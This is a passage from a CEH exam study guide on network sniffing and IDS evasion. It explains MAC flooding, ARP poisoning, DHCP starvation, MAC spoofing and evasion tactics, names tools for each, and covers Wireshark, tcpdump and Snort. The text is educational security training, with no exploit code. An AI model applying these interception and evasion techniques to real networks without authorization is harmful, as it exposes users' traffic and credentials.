and about looking to drop a sniffer onto a network segment and you see your target uses
hubs, try to contain your excitement because your job just became much easier.

NOTE You’re probably as likely to see a hub in a target organization’s
network as you are a unicorn or a leprechaun. But passive sniing is testable
material, so you need to know it well. Besides, i you can ind Windows NT
machines and LM hashing out on networks, you can certainly get lucky and
come across a hub or two. Additionally, even though passive is, well, passive,
there are occasions where someone has a misconigured NIC on the subnet
and you’ll grab their stu too!

Active sniffing requires some additional work on your part, either from a packet injec-
tion or manipulation stance or from forcing network devices to play nicely with your
efforts. Active sniffing usually means the collision domain you are part of is segmented
from those you want to look in to, which probably means you’re attached to a switch. And
if you’re connected to a switch, sniffing requires some additional work. On the outside,
a switch looks much like a hub: it’s a box with a lot of blinky lights, ports for connecting
machines on the front, and a power cord in the back. Inside, though, it’s a lot different.
If you take the lid off a hub, it would look very much (virtually, anyway) like a single
wire with attached wires running to each port. Shock one port and everyone gets shocked
since they’re all wired together. The inside of a switch looks the same; however, each
port’s wire is separated from the main line by a switch that gets closed only when a mes-
sage is received for that port. The problem with switches in sniffing is that you’ll receive
only those messages intended for your own port. One trick for active sniffing purposes is
to get the switch to close the port you are connected to every time it closes the port you
want to sniff.

Getting a switch to send a message to both the port it was addressed to and the port
you’re connected to for sniffing can be accomplished by configuring something called a
span port. A span port is one in which the switch configuration has been altered to send a
copy of all frames from one port, or a succession of ports, to another. In other words, you
tell the switch, “Every time you receive and send a frame to port 1 through 10, also send
a copy to the span on port 25.” Also called port mirroring, this isn’t necessarily a simple
thing to do (you must have access to the switch configuration to set it up), but it’s fairly
common practice in network monitoring.

04-ch04.indd 156 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

157

NOTE Not every switch on the planet has the capability to perorm port
spanning. Additionally, most modern switches (or example, Cisco’s) don’t
allow a port that is conigured to span as one that can transmit data. In other
words, your span port can listen but cannot send anything.

Sniffing Tools and Techniques
A lot of sniffing really boils down to which tool you decide to use. Tons of sniffers are
available. Some of them are passive sniffers, simply pulling in frames off the wire as they
are received. Others are active sniffers, with built-in features to trick switches into send-
ing all traffic their way. In the interest of time, page count, and your study (since this
one will be on your exam), we’ll discuss Wireshark. Ettercap, EtherPeek, and even Snort
(better known as an IDS, though) are also examples of sniffers.

Techniques
While it would be fun to find a network full of hubs and an open port just sitting there
waiting for you to connect, the real world isn’t like that. Equipment is in highly secured
cabinets, port security is turned on, and hubs are nowhere to be seen except on someone’s
USB so they have enough ports available to charge their phone and use the USB cannon
geek toy. So where do we turn for help in manipulating devices and traffic to enhance our
sniffing efforts? The following techniques will help.

MAC Flooding
Suppose you don’t know how to reconfigure the switch OS to set up a span port, or
you just don’t have the access credentials to log in and try it. Are you out of luck? Not
necessarily. Another option you have is to so befuddle and confuse the switch that it
simply goes bonkers and sends all messages to all ports—and you can do this without
ever touching the switch configuration. To explain how this all works, come with me on
a short journey into the mind of a switch and learn how the whole thing works with an
overly simplistic, but accurate, account.

Imagine a switch comes right out of the box and gets plugged in and turned on. All
these cables are connected to it, and there are computers at the end of all these cables,
each with its own unique MAC address. All the switch knows is flooding or forwarding.
If it receives a message that’s supposed to go to everyone (that is, a broadcast or multicast
frame), the decision is easy, and it will flood that message to all ports. If the switch receives
a unicast message (that is, a message with a single MAC address for delivery), and it
knows which port to send it to, it will forward the frame to that single port. If the switch
doesn’t know which port to send the message to, it will flood it to all, just to be sure.

Flooding all packets to every port will certainly get them to where they’re going, but
it’s not very efficient, and the switch was built to split collision domains and improve
efficiency. Therefore, it has to learn who is on what port so it can deliver messages appro-
priately. To do so, it waits patiently for messages to start coming in. The first frame
arrives and it’s a doozy—a broadcast message from a computer with a MAC address
of “A” attached to port 1 is sending an ARP message looking for the MAC address of
another computer.

04-ch04.indd 157 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

158

The switch opens up a little virtual book and writes “MAC A is on switchport 1—any
messages I see for MAC A can be sent directly to switchport 1.” It then sends the broad-
cast message out to every available switchport, and patiently waits to see who replies.
A computer on switchport 2 answers with an ARP reply stating, “I have the IP address
you’re looking for, and my MAC address is B.” The switch adds to its little virtual note-
book, “MAC B is on switchport 2—any messages I see for B can be sent directly to
switchport 2.” This continues until the little virtual book has an entry for every port, and
the switch hums along, happily delivering messages.

In our story here, the little virtual notebook is called the content addressable memory
(CAM) table. As you can imagine, since you know how ARP works now and you know
how many packets are delivered back and forth in any given second or so, the CAM table
gets updated very often. And if it’s empty, or full, everything is sent to all ports.

NOTE MAC looding is big in the ECC CEH world, but in reality it’s not easy
to do, will probably impair switch unctions beore you get anything useul,
and doesn’t last long i you are able to pull it o. Oh, and it will get you
caught. Most modern switches protect against MAC loods (via port security)
but may still be susceptible to MAC spooing. Just so you know.

You can use this to your advantage in sniffing by figuring out a way to consistently
and constantly empty the CAM table, or by simply confusing the switch into thinking
the address it’s looking for is not available in the table, so it should just send it out to all
ports—including the one you’re sniffing on. This method, which doesn’t work on a lot of
modern switches but is questioned repeatedly and often on your exam, is known as MAC
flooding. The idea is simple: send so many MAC addresses to the CAM table it can’t keep
up, effectively turning it into a hub. Because the CAM is finite in size, it fills up fairly
quickly, and entries begin rolling off the list. Etherflood and Macof are examples of tools
you can use to conduct MAC flooding.

EXAM TIP In an utterly ridiculous semantic exercise, ECC deines some
versions o MAC looding as “switch port stealing.” The idea is the same—
lood the CAM with unsolicited ARPs. But instead o attempting to ill the
table, you’re only interested in updating the inormation regarding a speciic
port, causing something called a “race condition,” where the switch keeps
lipping back and orth between the bad MAC and the real one.

ARP Poisoning
Another effective active sniffing technique is ARP poisoning (aka ARP spoofing or gra-
tuitous ARP). This refers to the process of maliciously changing an ARP cache on a
machine to inject faulty entries, and it’s not really that difficult to achieve. As stated
earlier, ARP is a broadcast protocol. So, if Machine A is sitting there minding its own
business and a broadcast comes across for Machine B that holds a different MAC address
than what was already in the table, Machine A will instantly update its ARP cache—
without even asking who sent the broadcast. To quote the characters from the movie
Dude, Where’s My Car?, “Sweet!”

04-ch04.indd 158 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

159

NOTE Tons o tools are available or ARP poisoning; however, you have some
big considerations when using them. First, the ARP entries need updating
requently; to maintain your “control,” you’ll need to always have your ake
entry update beore any real update comes past. Second, remember ARP is a
broadcast protocol, which means ARP poisoning attempts can trigger alerts
pretty quickly. And lastly, speed always wins here: i a machine ARPs and the
hacker responds beore the intended recipient does…

Because ARP works on a broadcast, the switch will merrily flood all ARP packets—
sending any ARP packet to all recipients. Be careful, though, because most modern
switches have built-in defenses for too many ARP broadcasts coming across the wire (for
example, you can configure Dynamic ARP Inspection using DHCP snooping inside
Cisco IOS). Also, administrators can deploy a wide variety of network monitoring tools,
such as XArp (www.xarp.net/), to watch for this, and some savvy network administrators
manually add the default gateway MAC permanently (using the command arp -s) into
the ARP cache on each device. Some tools that make ARP flooding as easy as pressing
a button are Cain and Abel (https://sectools.org), arpspoof (https://linux.die.net), bet-
tercap (https://www.bettercap.org) and dsniff (https://www.monkey.org).

EXAM TIP When it comes to ARP poisoning deense, consider coniguring
Dynamic ARP Inspection (DAI) on your Cisco routers.

DHCP Starvation
For some reason, EC-Council includes DHCP starvation, an attack whereby the mali-
cious agent attempts to exhaust all available addresses from the server, in the discussion
with sniffing. Although DHCP starvation is more of a type of denial-of-service attack,
don’t be surprised to see it pop up in a sniffing question. Why does ECC include it in
sniffing discussions? I don’t have a clue. All I do know is you need to know how DHCP
works and what the attack does.

When a network is set up, the administrator has two options. The first is to manually
configure (and keep track of ) IP addresses on every system in the network. While this
does have several advantages, static addressing comes with a lot of problems—like keep-
ing track of all those IPs, for example. Another solution, and one used on virtually every
network on the planet, is to hand out and monitor all these IPs automatically. Dynamic
Host Configuration Protocol (DHCP) is the protocol for the job.

DHCP is actually fairly simple. A DHCP server (or more than one) on your network
is configured with a pool of IP addresses. You tell it which ones it can hand out, which
ones are reserved for static systems already, and how long systems can keep (or lease) the
addresses, assign a few other settings, and then turn it loose. When a system comes on
the network, it sends a broadcast message known as a DHCPDISCOVER packet, ask-
ing if anyone knows where a DHCP server is. The DHCP relay agent responds with the
server’s info and then sends a DHCPOFFER packet back to the system, letting it know
the server is there and available. The system then sends back a DHCPREQUEST packet,

04-ch04.indd 159 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

160

NETWORK CLIENT DHCP SERVER
STEP 1 – Client needs to find a server.
Client sends DHCPDISCOVER packet.

STEP 2 – Server responds with availability.
Server sends DHCPOFFER packet.

STEP 3 – Client asks for an IP address and configuration.
Client sends DHCPREQUEST packet.

STEP 4 –Server responds with IP address and configuration.
Server sends DHCPACK packet.

Figure 4-6 DHCP in action

asking for an IP address. In the final step, the server responds with a DHCPACK mes-
sage, providing the IP address and other configuration information the system needs (see
Figure 4-6 for a, hopefully, clear visual of the process). An easy way to remember it all is
the acronym DORA—Discover, Offer, Request, and Acknowledge.

NOTE The packets in DHCPv6 have dierent names rom those o DHCPv4.
DHCPDISCOVER, DHCPOFFER, DHCPREQUEST, and DHCPACK are known
in DHCPv6 as Solicit, Advertise, Request (or Conirm/Renew), and Reply,
respectively.

So how does DHCP starvation work? First, the attacker sends unending, forged
DHCP requests to the server on the subnet. The server attempts to fill every request,
which results in its available IP address pool running out quickly. Any legitimate system
attempting to access the subnet now cannot pull a new IP address or renew its current
lease. DHCP starvation attacks can be carried out by tools such as Yersinia (https://tools
.kali.org/vulnerability-analysis/yersinia) and Dhcpstarv (http://dhcpstarv.sourceforge
.net/). Configuring DHCP snooping on your network device is considered the proper
mitigation against this attack.

EXAM TIP Another un DHCP attack is known as using a “rogue DHCP server.”
An attacker sets up his own DHCP server on the network and starts handing
out bad IP addresses to legitimate systems connecting to the network.
Whether in conjunction with the DHCP starvation attack or not, this could
allow an attacker to redirect communications sessions.

Spoofing
Finally, in our romp through traffic-misdirection efforts, we need to spend a little time
on spoofing. Whether IP, MAC, DNS, or otherwise, spoofing is simply pretending to
be an address you’re not. We’ve already explored spoofing in general, so this concept
shouldn’t be anything new to you.

MAC spoofing (aka MAC duplication) is a simple process of figuring out the MAC
address of the system you wish to sniff traffic from and changing your MAC address to
match it. And just how do you change the MAC address on your system? Well, there

04-ch04.indd 160 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

161

are multiple methods, depending on the OS you use, but they’re all fairly simple. In a
feature introduced way back in Windows 8, for instance, you can use the Advanced tab
on the NIC properties and just type in whatever you want, or you can go to the registry
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-
e325-11ce-bfc1-08002be10318} and find the proper string to update for your NIC. If
you’d rather use a tool to do it all for you, SMAC (http://www.klcconsulting.net/smac/)
is a good bet.

When a MAC address is spoofed, the switch winds up with multiple entries in the
CAM table for a given MAC address. Unless port security is turned on, the latest entry
in the table is the one that is used. Port security refers to a security feature on switches
that allows an administrator to manually assign MAC addresses to a specific port; if
the machine connecting to the port does not use that particular MAC address, it isn’t
allowed to connect. In truth, this type of implementation turns out to be a bit of a pain
for the network staff, so most people don’t use it that way. In most cases, port security
simply restricts the number of MAC addresses connected to a given port. Suppose your
Windows machine runs six virtual machines (VMs) for testing, each with its own MAC
address. As long as your port security allows for at least seven MACs on the port, you’re
in good shape. Anything less, the port will turn amber, SNMP messages will start firing,
and you’ll be left out in the cold—or have a network admin come pay you a visit.

NOTE In modern networks, most switch admins conigure ports to a
speciic number o MAC addresses. I the port tries to resolve more than that
number, it’ll die (or “amber out” in nerd lingo) or, even worse or the hacker,
stay on but notiy the admin someone is up to no good.

For example, suppose “Good Machine,” with MAC address 0A-0B-0C-AA-BB-CC, is
on port 2. The switch has learned any frame addressed for that MAC should go to port 2
and no other. The attacker attaches “Bad Machine” to port 3 and wants to see all packets
Good Machine is receiving. The attacker uses an application such as Packet Generator
(aka pacgen; https://sourceforge.net/projects/pacgen/) to create multiple frames with the
source address of 0A-0B-0C-AA-BB-CC and sends them off (it doesn’t really matter
where). The switch will notice that the MAC address of Good Machine, formerly on
port 2, seems to have moved to port 3 and will update the CAM table accordingly. So
long as this is kept up, the attacker will start receiving all the frames originally intended
for Good Machine. Not a bad plan, huh?

Plenty of other spoofing opportunities are out there for the enterprising young ethi-
cal hacker. Ever heard of IRDP spoofing? It’s a neat attack (at least it was neat way back
in 1999) where the hacker sends spoofed ICMP Router Discovery Protocol messages
through the network, advertising whatever gateway she wants all the systems to start
routing messages to. Fun! Another one is DNS poisoning (introduced in Chapter 2),
which can have much the same effect. And if everyone gets their DNS information from
a proxy, well that’s just all sorts of mischief. In short, spoofing may not be the most tech-
nical attack in the world, but it sure can bring home the bacon for you.

04-ch04.indd 161 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

162

EXAM TIP Another sniing method called out is “STP attacks.” In this, the bad
guy attaches a rogue switch to the network, changing the operation o STP
(Spanning Tree Protocol) by setting the priority o the rogue switch lower
than all others. This doesn’t allow sniing o all traic, o course, but does
reveal a variety o rames or the attacker to peruse.

Tools
Wireshark is probably the most popular sniffer available, mainly because it is free, it is
stable, and it works really well. Previously known as Ethereal, Wireshark can capture pack-
ets from wired or wireless networks and provides a fairly easy-to-use interface. The top
portion of the display is called the Packet List and shows all the captured packets. The
middle portion, Packet Detail, displays the sections within the frame and packet headers.
The bottom portion displays the actual hex entries in the highlighted section. Once you
get used to the hex entries, you’ll be surprised what you can find in them. For example,
you can scroll through and pick up ASCII characters from a Telnet login session.

Wireshark also offers an almost innumerable array of filters you can apply to any given
sniffing session, and you can fine-tune your results to exactly what you’re looking for.
Additionally, the good folks who created Wireshark have provided a multitude of sample
captures for you to practice on—simply go to www.wireshark.org and download what
you wish to try out!

NOTE On some systems you may need to set the tool to run as administrator.
Not doing so causes all kinds o headaches in trying to run in promiscuous
mode.

Following a TCP stream is a great way to discover passwords in the clear. For instance,
I downloaded one of the capture files from Wireshark (clicking Sample Captures in the
Files section, in the center of the window, gives you plenty to download and play with)
regarding a Telnet session. After opening the file, I sorted by protocol and selected the
first Telnet packet I could find. A right-click, followed by selecting Follow TCP Stream,
gave me the entire session, including the logon information, as shown in Figure 4-7.

Another great feature of Wireshark is its ability to filter a packet capture to your
specifications. A filter can be created by typing in the correct stream in the Filter field,
by right-clicking a packet or protocol header and choosing Apply As Filter, or by clicking
the Expression button beside the Filter field and checking off what you’d like. In any case,
the filter will display only what you’ve chosen. For example, in Figure 4-8, only Telnet
packets will be displayed. In Figure 4-9, all packets with the source address 192.168.0.2
will be shown.

Filters are of great use when you set up a packet capture for a long period of time,
and they will show up in bunches on your exam. For example, the string ! (arp or
icmp or dns) filters out all the annoying ARP, ICMP, and DNS packets from your
display. The http.request string displays all the HTTP GET requests, while the tcp
contains string argument displays all TCP segments that contain the word “string.”

04-ch04.indd 162 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

163

Figure 4-7 Telnet session in Wireshark

Figure 4-8 Telnet ilter in Wireshark

Figure 4-9 IP source address ilter

The expression ip.addr==172.17.15.12 && tcp.port==23 displays all Telnet packets
containing the IP address 172.17.15.12, while the expression ip.addr==172.17.15.12
or ip.addr==172.17.15.60 shows packets containing either address. The combinations
are endless.

04-ch04.indd 163 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

164

EXAM TIP There are innumerable ilter combinations in Wireshark. I simply
could not include them all in this book, nor could you possibly memorize
them all. But make very sure you are amiliar with what the equal to, and, and
or conjunctions mean. Equal to (==) means exactly what it says—the packet
will display i the argument appears in the packet. And (&&) means the
packet will display only i both arguments appear. Or (or) means the packet
will display i either argument appears.

During a capture, you can also select Capture Filters from the Capture menu and
choose from a variety of predefined options. For example, No Broadcast and No Mul-
ticast is a good option to use if you want to cut down on the number of packets you’ll
have to comb through (only packets addressed explicitly to a system on the subnet will
be shown). There are endless combinations of filters you can use. Take advantage of the
sample captures provided by Wireshark and play with the Expression Builder—it’s the
only real way to learn.

NOTE Wireshark also has the ability to ilter based on a decimal numbering
system assigned to TCP lags. The assigned lag decimal numbers are FIN =
1, SYN = 2, RST = 4, PSH = 8, ACK = 16, and URG = 32. Adding these numbers
together (or example, SYN + ACK = 18) allows you to simpliy a Wireshark
ilter. For example, tcp.flags == 0x2 looks or SYN packets, tcp.flags == 0x16
looks or ACK packets, and tcp.flags == 0x18 looks or both.

Lastly, since Wireshark is the recognized standard in sniffing applications, and
EC-Council tests it heavily, you should know it very, very well. I toyed a lot with adding
a bunch of Wireshark exercises here but decided against reinventing the wheel. A quick
visit to the home page and a search for help and documentation reveals the good folks at
Wireshark have provided a ton of help for those seeking it (www.wireshark.org/docs/).
Downloads, how-to guides, and even videos detailing multiple network scenarios are all
available. I highly recommend you visit this page and run through the help videos. They
are, in a word, awesome.

Another “old-school” tool you’ll definitely see in use on your pen tests, and probably
on your exam as well, is tcpdump. Although there is a more recent Windows version
(WinDump), tcpdump has been a Unix staple from way, way back, and many people just
love the tool. It has no bells and whistles—this is a command-line tool that simply prints
out a description of the contents of packets on a network interface that match a given
filter (Boolean expression). Just point tcpdump to an interface, tell it to grab all packets
matching a Boolean expression you create, and voilà! You can dump these packets to the
screen, if you really like Matrix-y characters flying across the screen all the time, or you
can dump them to a file for review later.

The syntax for this tool is fairly simple: tcpdump flag(s) interface. However, the
sheer number of flags and the Boolean combinations you can create can make for some
pretty elegant search strings. For a simple example, tcpdump -i eth1 puts the interface
in listening mode, capturing pretty much anything that comes across eth1. If you were to

04-ch04.indd 164 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

165

add the -w flag, you could specify a file in which to save the data, for review later. If you
get nuts with them, though, the Boolean expressions show tcpdump’s power. The follow-
ing command shows all data packets (no SYN, FIN, or ACK-only) to and from port 80:

tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) -
((tcp[12]&0xf0)>>2)) != 0)'

Take some time to review the tcpdump man page at www.tcpdump.org/tcpdump_
man.html, which provides a variety of great examples, as well as good write-ups on each
of the flags available. But don’t worry too much—no one is going to expect you to write a
35,000-character Boolean expression on the exam. You should, though, know basic flags
for tcpdump—particularly how to put the interface in listening mode (-i), how to write
to a file (-w), and how to use the tool.

EXAM TIP Another tool you may want to check out is tcptrace (https://
linux.die.net/man/1/tcptrace). It is used to analyze iles produced by several
packet-capture programs and can easily read rom tcpdump, WinDump,
Wireshark, and EtherPeek.

Of course, you have plenty of other choices available in sniffers. Ettercap (https://
www.ettercap-project.org/) is a powerful sniffer and man-in-the-middle suite of programs.
It is available as a Windows tool but works much better in its native Unix platform.
Ettercap can be used as a passive sniffer, an active sniffer, and an ARP poisoning tool.
Other great sniffers include Capsa Network Analyzer (https://www.colasoft.com/capsa/),
Snort (https://www.snort.org), most often discussed as an IDS application, Sniff-O-Matic
(https://sniff-o-matic.soft112.com/), SteelCentral Packet Analyzer (https://www.riverbed
.com), and OmniPeek (https://liveaction.com). And if you’re looking into the mobile
world, check out Sniffer Wicap and Packet Capture from the Google Play store.

NOTE tcpdump is a built-in utility or all Unix systems, so you have no
worries there. But Wireshark is considered by many organizations as a
hacking tool, and Ettercap is always considered a hacking tool. I you value
your job, I highly suggest you don’t install these on your work desktop
without irst checking to see i it’s okay.

Evasion
All this talk about sniffing and listening in on network conversations makes this whole
sordid business sound pretty easy. However, our adversaries (a very strong word, since
we’re all on the side of bettering security)—those guys who manage and administer
the network and systems we’re trying to gain access to—aren’t going to just sit by and
let us take whatever we want without a fight. They are doing everything in their power
to make it as difficult as possible for the aspiring ethical hacker, and that means taking
advantage of a multitude of hardware and software tools. As stated before, as an ethical

04-ch04.indd 165 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

166

hacker, you certainly won’t be expected to know how to crack the latest and greatest net-
work roadblock efforts; however, you are expected to (and should) know what they are
and what, if anything, you can do about them.

Devices Aligned Against You
Intrusion detection has come a long way in the past 15 years or so. What used to be a
fringe effort, tacked on to someone’s “real” job, now is a full-time career of its own. As
the name implies, intrusion detection is all about identifying intrusion attempts on your
network. Sometimes this is simply a passive effort—to notify others of what might be
happening. Other times it becomes much more active in nature, letting one punch back,
so to speak, at the bad guys. When it comes to ethical hacking, it’s useful to know how
intrusion detection works and what, if anything, you can do to get around it.

Intrusion detection systems (IDSs) are hardware and/or software devices that exam-
ine streams of packets for unusual or malicious behavior. Sometimes this is done via a
signature list, where the IDS compares packets against a list of known traffic patterns
that indicate an attack. When a match is made, the alarm sounds. Other IDSs may be
anomaly (or behavior) based, making decisions on alerts based on learned behavior and
“normal” patterns—anything out of the ordinary for a normal day sounds the alarm.

EXAM TIP Ever heard o libwhisker? It’s a ull-eatured Perl library used
or HTTP-related unctions, including vulnerability scanning, exploitation,
and, o course, IDS evasion. Check it out at https://sourceorge.net/projects/
whisker/.

They both have benefits and drawbacks. A signature-based IDS is only as good as
the signature list itself; if you don’t keep it up to date, newer intrusion methods may go
undetected. A behavior-based IDS may be better at picking up the latest attacks because
they would definitely be out of the norm, but such systems are also known to drive
administrators crazy with false positives—that is, an alarm showing an intrusion has
occurred when, in reality, the traffic is fine and no intrusion attempt has occurred. Using
an anomaly-based IDS is, by its nature, difficult because most network administrators
simply can’t know everything going on in their networks.

As an aside, although a false positive is easy enough to identify, you need to be famil-
iar with another term in regard to IDSs (and your exam). A false negative occurs when
the IDS reports a particular stream of traffic is just fine, with no corresponding alarm or
alert, when, in fact, an intrusion attempt did occur. False negatives are considered far worse
than false positives, for obvious reasons. Unfortunately, many times these aren’t discerned
until well after an attack has occurred.

IDSs are defined not only by what they use to make a decision but also where they
are located and their span of influence. A host-based IDS (HIDS) is usually a software
program that resides on the host itself. More often than not a HIDS is signature based
(although anomaly and heuristic engines get better and better every day), and its entire
job is to watch that one host. It looks for traffic or events that would indicate a problem

04-ch04.indd 166 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

167

for the host itself. Some examples of popular HIDSs include Cybersafe, Tripwire, Norton
Internet Security, and even firewalls and other features built into the operating system.

NOTE Ever heard o HBSS? The Department o Deense (DoD) loves it. The
Host Based Security System (HBSS) is a lexible commercial-o-the-shel
(COTS) application that monitors, detects, and counters against known
cyberthreats to DoD Enterprise. The plan is to have HBSS on each host
(server, desktop, and laptop) in the DoD—which, o course, will attempt to
protect them against attacks during a penetration test.

On the other hand, a network-based IDS (NIDS) sits on the network perimeter. Its
job, normally, is to watch traffic coming into, and leaving, the network. Whether signa-
ture or anomaly based, a NIDS sits outside or inside the firewall (either works so long as
the NIDS is placed where it can see all traffic) and is configured to look for everything
from port and vulnerability scans to active hacking attempts and malicious traffic. A
large network may even employ multiple NIDSs at various locations in the network, for
added security. An exterior NIDS outside the firewall would watch the outside world,
whereas one placed just inside the firewall on the DMZ could watch your important
server and file access. Dozens upon dozens of IDS and software options are available;
however, the one used more often than any other, and the one you’ll see on your exam
more often than not, is Snort.

Snort
By far the most widely deployed IDS in the world, Snort is an open source IDS that com-
bines the benefits of signature, protocol, and anomaly-based inspection. It has become
the commonly acknowledged standard for intrusion detection and is in use on networks
ranging from small businesses to U.S. government enterprise systems. It is a powerful
sniffer, traffic-logging, and protocol-analyzing tool that can detect buffer overflows, port
scans, operating system fingerprinting, and almost every conceivable external attack or
probe you can imagine. Its rule sets (signature files) are updated constantly, and support
is easy to find.

Interview with the Hacker
No, I’m not going to recite Anne Rice novel quotes to you. I am going to pay her
the “sincerest form of flattery” by borrowing (stealing) the tagline from her book,
though, and twisting it for my own use.

If you were to corner a pen tester, a good pen tester, and perform an interview
on what they think about hacking—specifically dealing with IDS evasion—you’d
probably hear the same couple of conclusions. I think we hit on them in this chapter

(continued )

04-ch04.indd 167 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

168

already, but it’s always helpful to see another perspective—to hear it laid out in a
different way. To accomplish this, I chatted with our tech editor during the review
of this chapter and got some sound advice to pass along (credit goes to Mr. Horton
for these gems):

• The best nugget of wisdom we can give If a business is an attacker’s single
target, time is on the attacker’s side. There is so much noise on the Internet
from random scans, probes, and so on, that a determined attacker can just
take weeks and hide in it. As a pen tester, you rarely have that much time,
and it is your greatest limitation. If you’re expected to act as the bad guy and
are given only seven days to perform, you will be detected. The trade-off
between threat fidelity and unlimited time is difficult to balance.

• Where real hackers thrive Most true experts in the field don’t spend time
trying to avoid your signatures; they spend their time trying to make sure
they blend in. The nemesis of all IDSs is encryption; your critical financial
transaction sure looks like my remote agent traffic when they’re both going
through SSL (or TLS for that matter). Although there are SSL termination
points and other things you can use, the bottom line is that encryption
makes IDSs far less useful, barring some mechanism to decrypt before
running it through.

• “Cover fire” works in the virtual world too If the attacker has a bunch
of IP addresses to sacrifice to the giant network blocker in the sky, some
nikto and nmap T5 scans might just do the trick to obfuscate the real attack.
This is straight-up cover fire—and it works!

• There’s a difference between “someone” and “anyone” The tactics,
techniques, and procedures of an adversary targeting you are far different
from those of an adversary targeting someone. Determining whether your
business is of interest to anyone versus someone is critical to determining the
resources you should invest into cyber protection.

• An IDS is not foolproof Much like a firewall, an IDS is simply one tool
in the arsenal to defend against attacks. Encryption, stealth, and plain-old
cover fire can all work to your advantage as a pen tester.

Snort runs in three different modes. Sniffer mode is exactly what it sounds like and
lets you watch packets in real time as they come across your network tap. Packet Log-
ger mode saves packets to disk for review at a later time. Network Intrusion Detection
System mode analyzes network traffic against various rule sets you pick from, depending

04-ch04.indd 168 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

169

on your network’s situation. NIDS mode can then perform a variety of actions based on
what you’ve told it to do.

NOTE A network tap is any kind o connection that allows you to see
all traic passing by. It can be as simple as a hub connected on the
segment you’d like to watch or as complex as a network appliance created
speciically or the task. Just keep two points in mind: First, where you
place the tap determines exactly what, and how much, traic you’ll be
able to see. Second, your tap should be capable o keeping up with the
data low (an old 486 running 10 Mbps hal-duplex connected to a iber
backbone running at 30 Mbps on a slow day will deinitely see some
packet loss).

Snort is not completely intuitive to set up and use, but it isn’t the hardest tool on the
planet to master either. That said, as much as I know you’d probably love to learn all the
nuances and command-line steps on how to set up and configure Snort completely, this
book is about the ethical hacker and not the network security manager. I’m charged with
giving you the knowledge you’ll need to pass the exam, so I’ll concentrate on the Snort
rules and the output. If you’re really interested in all the configuration minutiae, I suggest
grabbing the user manual as a start. It’s an easy read and goes into a lot of things I simply
don’t have the time or page count to do here.

The Snort “engine,” the application that actually watches the traffic, relies on rule
sets an administrator decides to turn on. For example, an administrator may want to be
alerted on all FTP, Telnet, and CGI attack attempts but could care less about denial-of-
service attempts against the network. The engine running on that network and the one
running on the government enterprise down the street that’s watching everything are the
same. The rule sets selected and put in place are what make the difference.

The Snort configuration file resides in /etc/snort on Unix/Linux and in c:\snort\etc\
on most Windows installations. The configuration file is used to launch Snort and con-
tains a list of which rule sets to engage at startup. To start Snort, a command like the
following might be used:

snort -l c:\snort\log\ -c c:\snort\etc\snort.conf

Basically this says, “Snort application, I’d like you to start logging to the directory
c:\snort\log\. I’d also like you to go ahead and start monitoring traffic using the rule sets
I’ve defined in your configuration file located in c:\snort\etc.”

The configuration file isn’t all that difficult to figure out either. It holds several variables
that need to be set to define your own network situation. For example, the variable
HOME_NET defines the subnet local to you. On my home network, I would define the
variable in the file to read as follows:

var HOME_NET 192.168.1.0/24

04-ch04.indd 169 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

170

Other variables I could set are displayed in the overly simplified snort.conf file shown
next. In this instance, I want to watch out for SQL attacks, but because I’m not hosting
any web servers, I don’t want to waste time watching out for HTTP attacks.

var HOME_NET 192.168.1.0/24
* Sets home network
var EXTERNAL_NET any
* Sets external network to any
var SQL_SERVERS $HOME_NET
* Tells Snort to watch out for SQL attacks on any device in the network defined
* as HOME.
var RULE_PATH c:\etc\snort\rules
* Tells Snort where to find the rule sets.
include $RULE_PATH/telnet.rules
* Tells Snort to compare packets to the rule set named telnet.rules and alert on
* anything it finds.

NOTE Some network security administrators aren’t very concerned with
what’s going on inside their networks and don’t want to see any traic
at all rom them in their Snort logs. I you change the external variable to
EXTERNAL_NET !$HOME_NET, Snort will ignore packets generated by your
home network that ind their way back inside.

If I were hosting websites, I’d turn that function on in the config file by using the
following entry:

var HTTP_SERVERS

SMTP_SERVERS, SQL_SERVERS, and DNS_SERVERS are also entries I could
add, for obvious reasons. To include a particular rule set, simply add the following line:

include $RULE_PATH/name_of_rule

